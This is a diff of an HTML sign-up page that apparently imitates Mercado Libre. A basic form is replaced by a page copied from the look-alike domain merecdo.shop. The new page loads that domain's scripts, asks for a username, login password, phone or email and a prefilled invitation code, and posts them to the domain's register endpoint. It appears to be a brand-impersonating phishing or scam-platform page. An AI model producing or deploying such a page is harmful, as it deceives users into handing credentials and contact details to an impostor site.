@@ -1,70 +1,159 @@
-<!DOCTYPE html>
-<html lang="es">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro - Mercado Libre</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
-            margin: 40px;
-        }
-        .registro {
-            background-color: white;
-            padding: 30px;
-            border-radius: 8px;
-            max-width: 400px;
-            margin: auto;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .registro h2 {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .formulario {
-            display: flex;
-            flex-direction: column;
-        }
-        .formulario label {
-            margin-top: 15px;
-        }
-        .formulario input {
-            padding: 12px;
-            margin-top: 5px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .formulario button {
-            margin-top: 25px;
-            padding: 15px;
-            background-color: #FF6F00;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-    </style>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
+<title>User registration - mercados</title>
+<meta name="keywords" content="mercados" />
+<meta name="description" content="mercados" />
+<meta name="format-detection" content="telephone=no">
+<link rel="shortcut icon" type="image/ico" href="https://merecdo.shop/favicon.ico">
+<link type="text/css" rel="stylesheet" href="https://merecdo.shop/template/mobile_user/css/style.css?v=201808062046" />
+<script type="text/javascript" src="https://merecdo.shop/public/js/jquery.js"></script>
+    <script type="text/javascript">
+        var You_confirm = "Confirmas";
+        var Do_you = "�Lo hace?";
+        var confirm = "Confirmar";
+        var cancel = "Cancelar";
+        var reminder = "Recordatorio";
+    </script>
+<script type="text/javascript" src="https://merecdo.shop/public/js/global.js"></script>
+<script type="text/javascript" src="https://merecdo.shop/public/js/arttpl.js"></script>
+    <script type="text/javascript" src="https://merecdo.shop/public/plugin/layer/layer.js"></script>
 </head>
-<body>
-    <div class="registro">
-        <h2>Registrate en Mercado Libre</h2>
-        <form class="formulario" action="https://www.youtube.com/watch?v=7UXtY4UMvL8" method="POST">
-            <label for="nombre">Nombre de Usuario:</label>
-            <input type="text" id="nombre" name="nombre" required>
-
-            <label for="contrasena">Contrasena:</label>
-            <input type="password" id="contrasena" name="contrasena" required>
-
-            <label for="telefono">Numero de Telefono:</label>
-            <input type="tel" id="telefono" name="telefono" required pattern="[0-9]{10,15}">
-
-            <button type="submit">Registrar</button>
-        </form>
-    </div>
+<body><style>body{background:#FFF!important;}</style>
+<div class="login_top">
+	<div class="zc_tt" style="color:#000;">Registro de usuario</div>
+	<div class="top_dl"><img src="https://merecdo.shop/attachment/2025-08/2025081219443317562l.jpg"></div>
+	<a class="u_fh" href="https://merecdo.shop/"><i class="sy_ico"></i></a>
+</div>
+<div class="">
+	<form method="post" id="form">
+	<div class="zc_box1">
+		<div class="dl_sx">
+			<a href="javascript:;" class="logintype js_reg sel" reg_type="phone">Registro Movil</a>
+			<a href="javascript:;" class="logintype js_reg" reg_type="email">Correo Electronico</a>
+			<div class="clear"></div>
+		</div>
+		<div class="clear"></div>
+		<div class="zc_list">
+			<div class="zc_mal zc_i1"><input style="border:none;line-height:50px;width:100%" type="text" name="user_name" class="zc_input1" placeholder="Nombre de usuario (5-15 caracteres)" /></div>
+		</div>
+		<div class="zc_list">
+			<div class="zc_mal zc_i2">
+				<input type="password" style="display:none;width:0;height:0;" disabled="disabled" />
+				<input type="password" name="user_pw" class="zc_input1" placeholder="Contrasena de inicio de sesion (6-20 caracteres)" autocomplete="new-password" />
+			</div>
+		</div>
+		<!--<div class="zc_list">
+			<div class="zc_mal zc_i2"><input type="password" name="user_pw1" class="zc_input1" placeholder="????????" /></div>
+		</div>-->
+		<div class="zc_list js_phone">
+			<div class="zc_mal zc_i5"><input type="text" name="user_phone" class="zc_input1" placeholder="Movil" /></div>
+		</div>
+		<div class="zc_list js_email" style="display:none">
+			<div class="zc_mal zc_i3"><input type="text" name="user_email" class="zc_input1" placeholder="Correo Electronico" /></div>
+		</div>
+		<div class="zc_list js_yqm" style="border-bottom: 0px;display: flex;flex-direction: column;height:100%">
+			Codigo de invitacion:<input type="text" name="invitationcode" class="" placeholder="Por favor, introduzca el c�digo de invitaci�n" style="" value="tg_69038a7b1fd03" />
+		</div>
+		<!--<div class="zc_list">
+			<div class="zc_mal zc_i4">
+				<input type="text" name="authcode" class="zc_input1" placeholder="?????" />
+				<img src="https://merecdo.shop/public/class/authcode.class.php?w=100&h=41" onclick="pe_yzm(this)" class="zc_imgyzm" style="cursor:pointer;" />
+			</div>
+		</div>-->
+					</div>
+	<div class="loginbtn" style="margin:20px;margin-top: 80px;">
+		<input type="hidden" name="reg_type" value="email" />
+		<input type="hidden" name="pesubmit" />
+		<input type="button" value="Registrarse" />
+	</div>
+	</form>
+	<div class="zh_zc1" style="text-align:center;"><a href="https://merecdo.shop/user.php?mod=do&act=login&fromto=" title="Iniciar sesi�n">Acceso directo</a></div>
+</div>
+<script type="text/javascript">
+$(function(){
+	$(".js_reg").click(function(){
+		$(".js_reg").removeClass("sel");
+		$(this).addClass("sel");
+		if ($(this).attr("reg_type") == 'email') {
+			$(".js_email").show().find(":input").removeAttr("disabled");
+			$(".js_phone").hide().find(":input").attr("disabled", "disabled");
+		}
+		else {
+			$(".js_phone").show().find(":input").removeAttr("disabled");
+			$(".js_email").hide().find(":input").attr("disabled", "disabled");	
+		} 
+		$(":input[name='reg_type']").val($(this).attr("reg_type"));
+		$(".zc_list:visible:last").css("border-bottom", "0");
+	})
+	$(".js_reg:eq(0)").click();
+	$(":button").click(function(){
+		if ($(":input[name='user_name']").val() == '') {
+			app_tip('Por favor ingrese su nombre de usuario');
+			return false;
+		}
+		if ($(":input[name='user_pw']").val() == '') {
+			app_tip('Por favor, introduzca su contrase�a para iniciar sesion');
+			return false;
+		}
+		/*if ($(":input[name='user_pw1']").val() == '') {
+			app_tip('???????');
+			return false;
+		}
+		if ($(":input[name='user_pw']").val() != $(":input[name='user_pw1']").val()) {
+			app_tip('????????????');
+			return false;
+		}*/
+		if ($(":input[name='reg_type']").val() == 'email' && $(":input[name='user_email']").val() == '') {
+			app_tip('Por favor, rellene su direcci�n de correo electronico');
+			return false;
+		}
+		if ($(":input[name='reg_type']").val() == 'phone' && $(":input[name='user_phone']").val() == '') {
+			app_tip('Por favor, introduzca su n�mero de tel�fono movil');
+			return false;
+		}
+		/*if ($(":input[name='authcode']").val() == '') {
+			app_tip('????????');
+			return false;
+		}*/
+		$(this).val('Load...');
+		app_submit('user.php?mod=do&act=register', function(json){
+			if (json.result) {
+				if ('' != '') {
+					app_open('', 1000);
+				}
+				else {
+					app_open('user.php', 1000);				
+				}
+			}
+			else {
+	    		$(":button").val('register');			
+			}
+		})
+	})
+})
+</script>
+<link rel="stylesheet" href="https://merecdo.shop/public/plugin/jqweui/weui.min.css">
+<link rel="stylesheet" href="https://merecdo.shop/public/plugin/jqweui/jquery-weui.min.css">
+<script src="https://merecdo.shop/public/plugin/jqweui/jquery-weui.js"></script>
+<script type="text/javascript" src="https://merecdo.shop/public/plugin/layer_mobile/layer.js"></script>
+<script type="text/javascript" src="https://merecdo.shop/public/js/app.js"></script>
+<script type="text/javascript">
+//??????
+function top_menu() {
+	if ($("#top_menu").is(":hidden")) {
+		$("#top_menu").show();
+	}
+	else {
+		$("#top_menu").hide();	
+	}
+	$("#top_menu a").live("click", function(){
+		$("#top_menu").hide();
+	})
+}
+pe_loadscript("https://merecdo.shop/api.php?mod=cron");
+</script>
 </body>
-
 </html>
-
-
